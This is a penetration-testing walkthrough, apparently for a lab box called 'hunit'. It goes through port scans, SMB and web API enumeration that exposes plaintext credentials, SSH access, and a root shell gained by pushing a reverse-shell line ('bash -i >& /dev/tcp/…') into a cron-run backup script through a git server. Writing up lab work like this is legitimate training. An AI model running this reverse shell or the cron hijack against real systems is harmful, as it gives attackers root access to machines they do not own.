## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.137.125
# HOSTNAME
hunit
# OPERATING SYSTEM
Arch Linux
# CREDENTIALS  
dademola:ExplainSlowQuest110                           // Found Post Enumeration
```
## OPEN PORTS DETAILS
```bash
8080/tcp  open  http-proxy  syn-ack ttl 61
12445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
18030/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.46 ((Unix))
43022/tcp open  ssh         syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)
```
# ENUMERATION
## PORT 12445 
```bash
# Nmap
12445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2

# Enumerationg shares
sudo netexec smb $ip --port 12445 --shares -u '' -p '' 

SMB         192.168.137.125 12445  HUNIT            [*] Unix - Samba (name:HUNIT) (domain:) (signing:False) (SMBv1:False)
SMB         192.168.137.125 12445  HUNIT            [+] \: 
SMB         192.168.137.125 12445  HUNIT            [*] Enumerated shares
SMB         192.168.137.125 12445  HUNIT            Share           Permissions     Remark
SMB         192.168.137.125 12445  HUNIT            -----           -----------     ------
SMB         192.168.137.125 12445  HUNIT            Commander       READ,WRITE      Dademola Files
SMB         192.168.137.125 12445  HUNIT            IPC$                            IPC Service (Samba 4.13.2)



# Note
- Found share \\$ip\Commander with read and write permissions

```
## PORT 8080 
```bash
# Nmap
8080/tcp  open  http-proxy  syn-ack ttl 61

- Found links
sudo curl -s $url| grep -oP 'href="\K[^"]+' | less
/css/main.css
/
/article/the-taste-of-rain
/article/in-a-station-of-the-metro
/article/over-the-wintry
/article/a-poppy-blooms
/article/lighting-one-candle
/article/a-world-of-dew
/article/the-old-pond

- Fuzzing 
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of md -o fuzz/ffuf-raft-large-directories -fc 403,404 -u $url/FUZZ/
error                   [Status: 500, Size: 105, Words: 3, Lines: 1, Duration: 38ms]
api                     [Status: 200, Size: 148, Words: 1, Lines: 1, Duration: 134ms]

sudo curl -s $url/api/ 
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}]
# Found 
- /api/
- /article/
- /user/

sudo curl -s $url/api/artilce/ 
sudo curl -s $url/api/user/
- usernames and passwords found  
- Usernames
jsanchez
jvargas
jwinters
rjackson
dademola
jsanchez
jvargas
jwinters
rjackson
- Passwords
d52cQ1BzyNQycg
KTuGcSW6Zxwd0Q
OuQ96hcgiM5o9w
yYJcgYqszv4aGQ
d52cQ1BzyNQycg
ExplainSlowQuest110
KTuGcSW6Zxwd0Q
OuQ96hcgiM5o9w
yYJcgYqszv4aGQ

- Found sus creds on plain text 
dademola:ExplainSlowQuest110

# Note
- Uses jQuery 

```
## PORT 18030
```bash
# Nmap
18030/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.46 ((Unix))


# Note
- Server - Apache/2.4.46 (Unix)
- Found Whack a Mole! game

```
## PORT 43022
```bash
43022/tcp open  ssh         syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
# Found creds worked
- creds: dademola:ExplainSlowQuest110
sudo ssh dademola@$ip -p 43022

[dademola@hunit ~]$ id
uid=1001(dademola) gid=1001(dademola) groups=1001(dademola)
[dademola@hunit ~]$ whoami
dademola
```
## PRIVILEGE ESCALATION
```bash
# cron
/var/spool/anacron:
total 16
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Nov  6  2020 cron.daily
-rw------- 1 root root    0 Nov  6  2020 cron.monthly
-rw------- 1 root root    9 Nov  6  2020 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh

- Found git ssh keys
/home/git/.ssh/

# From kali machine using git private key we clone /git-server folder
# Reference https://stackoverflow.com/questions/4565700/how-to-specify-the-private-ssh-key-to-use-when-executing-shell-command-on-git
sudo GIT_SSH_COMMAND='ssh -i git.key -p 43022' git clone git@$ip:/git-server/                                                                                             
Cloning into 'git-server'...                                                                                                                                              
remote: Enumerating objects: 12, done.                                                                                                                                    
remote: Counting objects: 100% (12/12), done.                                                 
remote: Compressing objects: 100% (9/9), done.                                                
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0                                                                                                             
Receiving objects: 100% (12/12), done.                                                                                                                                    
Resolving deltas: 100% (2/2), done.                

# Modify backups.sh with reverse shell
------------------------------------------------------------
#!/bin/bash
#
#
# # Placeholder
#
/usr/bin/bash -i >& /dev/tcp/192.168.45.156/8080 0>&1
------------------------------------------------------------

# change permission of backups.sh
sudo chmod +x ./backups.sh

# Set identity
sudo git config --global user.name "kali"
sudo git config --global user.email "kali@kali.(none)"
# add config
sudo git add -A
# commit
sudo git commit -m "pwn"
# push to the git server
sudo GIT_SSH_COMMAND='ssh -i ../git.key -p 43022' git push origin master

# start a listener using netcat on port 8080
sudo nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.137.125] 53032
bash: cannot set terminal process group (15532): Inappropriate ioctl for device
bash: no job control in this shell
[root@hunit ~]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@hunit ~]# whoami
whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Nov 26 23:06:48 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.137.125
Nmap scan report for 192.168.137.125
Host is up, received echo-reply ttl 61 (0.039s latency).
Scanned at 2024-11-26 23:06:51 IST for 183s
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE     REASON         VERSION
8080/tcp  open  http-proxy  syn-ack ttl 61
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: My Haikus
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3755
|     Date: Tue, 26 Nov 2024 17:39:01 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 26 Nov 2024 17:39:01 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Tue, 26 Nov 2024 17:39:01 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
12445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.6.2
18030/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.46 ((Unix))
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
43022/tcp open  ssh         syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7b:fc:37:b4:da:6e:c5:8e:a9:8b:b7:80:f5:cd:09:cb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdtyB+UZiCMunw9Cjpg1M5yda6gJvY9DgsuFuuTfMwpe1gRp6xnQparU4u+5h+KPkCvG1h2WCj9skJ4guDNY7KgidPsfxrbKBxE0815hkntRU+xZVZneSvX20yxSU8JGZgFJPSfTaTRiRvXgDY1ljJ4c+wq9QiAg0mpXyJzHLsJGZ9z9V+5Mm4+EC8yF3xla+TAFVZtykbTFSWjf/1nZS0famFh/TMSJ333s630q6VqLKBwJ0mc75Ui6Hk+9VlGNI29NejkQufCeYSebgGZHqIT+fcjjHIZWLJIBL/KIArcgHBTUbeXKBrEoNFsA+fFGewHYNxt7Ux+w7kYF0bEAel/TcwUN4b0ZbDY1iC/dPyfWk/gXtsnaQe8oYC+JkUZwz8wSgNhWecmJjS9P/C983M7IoyRaWR9yRqEN+h/yR10heEoAD/UOW6LnpoJNQQenev2B+z9XlW0rXUB8yLUZNiJm59bjJhYMTvEZLLaeoCd1IXbtfPfjWp7EO+3zfs2xc=
|   256 89:cd:ea:47:25:d9:8f:f8:94:c3:d6:5c:d4:05:ba:d0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL68h2Z2xFUEzj7sURecPLgl8HJIdhZlhl0fOycHpBBiStKmKVTpDVLoOMPCspSWGHO2APE0Pd+dloHVc6lfVCc=
|   256 c0:7c:6f:47:7e:94:cc:8b:f8:3d:a0:a6:1f:a9:27:11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJWx+j72EVaL4qf6GJyePnJCG+SbfHaHB3st9je9n8oR
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=11/26%Time=674607B5%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,F4A,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;ch
SF:arset=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203755\r\
SF:nDate:\x20Tue,\x2026\x20Nov\x202024\x2017:39:01\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x2
SF:0UP\n\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\x
SF:20commercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(html
SF:5up\.net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</tit
SF:le>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,\x20initial-scale=1,\x20user-scalabl
SF:e=no\"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css\
SF:"\x20/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t\
SF:t<!--\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">\
SF:n\t\t\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"ro
SF:w\">\n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<heade
SF:r\x20id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"log
SF:o\">My\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t<
SF:/div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\n
SF:\n\t\t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTTP
SF:Options,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nConte
SF:nt-Length:\x200\r\nDate:\x20Tue,\x2026\x20Nov\x202024\x2017:39:01\x20GM
SF:T\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x20505
SF:\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x
SF:20en\r\nContent-Length:\x20465\r\nDate:\x20Tue,\x2026\x20Nov\x202024\x2
SF:017:39:01\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><t
SF:itle>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x2
SF:0Supported</title><style\x20type=\"text/css\">body\x20{font-family:Taho
SF:ma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgro
SF:und-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px
SF:;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:
SF:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}
SF:</style></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\
SF:x20Version\x20Not\x20Supported</h1></body></html>");

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 26 23:09:54 2024 -- 1 IP address (1 host up) scanned in 185.78 seconds

```

